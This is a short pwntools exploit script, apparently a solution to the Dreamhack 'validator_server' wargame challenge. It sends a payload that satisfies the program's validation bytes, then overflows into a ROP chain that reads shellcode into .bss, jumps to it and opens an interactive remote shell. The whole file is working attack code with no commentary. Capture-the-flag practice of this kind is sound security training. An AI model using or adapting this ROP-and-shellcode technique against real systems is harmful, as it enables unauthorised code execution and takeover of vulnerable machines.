from pwn import *

#p = process("./validator_server")
p = remote("host3.dreamhack.games", 21301)
e = ELF("./validator_server")

bss = e.bss()

read_plt = e.plt['read']

pop_rdi_ret = 0x4006f3
pop_rsi_r15_ret = 0x4006f1
pop_rdx_ret = 0x40057b

context.arch = "amd64"

shellcode = asm(shellcraft.sh())

payload = b"DREAMHACK!"
payload += b"A"

cur = b"\x7f"

for i in range(11, 0x81):
	payload += cur
	cur = p8(u8(cur) - 0x1)

payload += b"A"*7
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_r15_ret)
payload += p64(bss)
payload += p64(0)
payload += p64(pop_rdx_ret)
payload += p64(len(shellcode))
payload += p64(read_plt)
payload += p64(bss)

print(payload)

p.send(payload)
p.send(shellcode)
p.interactive()
